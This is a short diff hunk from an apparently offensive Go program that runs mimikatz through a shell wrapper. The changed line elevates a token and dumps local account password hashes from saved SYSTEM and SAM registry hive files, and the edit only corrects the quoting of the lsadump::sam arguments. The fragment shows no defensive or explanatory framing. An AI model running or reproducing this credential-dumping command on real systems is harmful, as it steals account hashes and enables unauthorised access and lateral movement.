@@ -28,7 +28,7 @@ func main(){
 		panic(err.Error())
 	}
 	fmt.Println(stdout)
-	stdout, _, err = shell.Execute("cd mimi\\x64 ; .\\mimikatz 'token::elevate' lsadump::sam system2.hiv sam2.hiv exit")
+	stdout, _, err = shell.Execute("cd mimi\\x64 ; .\\mimikatz 'token::elevate' 'lsadump::sam system2.hiv sam2.hiv' exit")
 	if err != nil {
 		panic(err.Error())
 	}
